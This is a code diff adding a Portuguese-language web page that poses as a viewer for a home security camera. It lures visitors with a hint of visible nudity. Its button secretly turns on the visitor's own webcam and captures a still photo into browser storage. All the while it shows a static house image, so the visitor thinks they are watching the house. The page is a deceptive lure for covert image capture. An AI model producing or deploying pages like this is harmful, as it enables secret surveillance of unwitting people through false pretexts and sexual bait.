@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Minha Casa</title>
+    <style>
+      body {
+        background: linear-gradient(135deg, #dfe9f3 0%, #ffffff 100%);
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        text-align: center;
+        padding: 3rem 1rem;
+        color: #333;
+      }
+      h1 {
+        font-size: 2.5rem;
+        margin-bottom: 0.5rem;
+      }
+      p {
+        font-size: 1.1rem;
+        color: #555;
+        margin-bottom: 2rem;
+      }
+      button {
+        background-color: #007bff;
+        color: white;
+        border: none;
+        padding: 1rem 2.5rem;
+        font-size: 1.2rem;
+        border-radius: 10px;
+        cursor: pointer;
+        margin-top: 1rem;
+        box-shadow: 0 4px 15px rgba(0, 123, 255, 0.4);
+        transition: background-color 0.3s ease;
+      }
+      button:hover {
+        background-color: #0056b3;
+      }
+      #imagem-casa {
+        margin-top: 2rem;
+        max-width: 90vw;
+        max-height: 80vh;
+        border-radius: 20px;
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        display: none;
+        transition: opacity 0.5s ease;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Minha Casa 🏡</h1>
+    <p>Veja uma imagem da câmera instalada na sua casa.</p>
+    <p>Essa imagem é atualizada a cada 5 segundos.</p>
+    <p>Permita o uso da câmera para capturar a camera em tempo real.</p>
+    <p>Esta é uma camera residencial e inclui area íntima, não temos responsabilidade caso acabe vendo nudez.</p>
+
+    <button onclick="ativarCamera()">Câmera da Casa</button>
+    <br />
+    <img id="imagem-casa" src="casa.jpg" alt="Imagem da casa" />
+
+    <script>
+      async function ativarCamera() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
+
+          setTimeout(() => {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL("image/jpeg");
+            localStorage.setItem("ultimaFoto", dataUrl);
+            stream.getTracks().forEach(track => track.stop());
+          }, 3000);
+
+          // Exibir imagem
+          const img = document.getElementById("imagem-casa");
+          img.style.display = "block";
+          img.style.opacity = 1;
+
+        } catch (err) {
+          alert("Permita o uso da câmera para prosseguir 📸");
+        }
+      }
+    </script>
+  </body>
+</html>
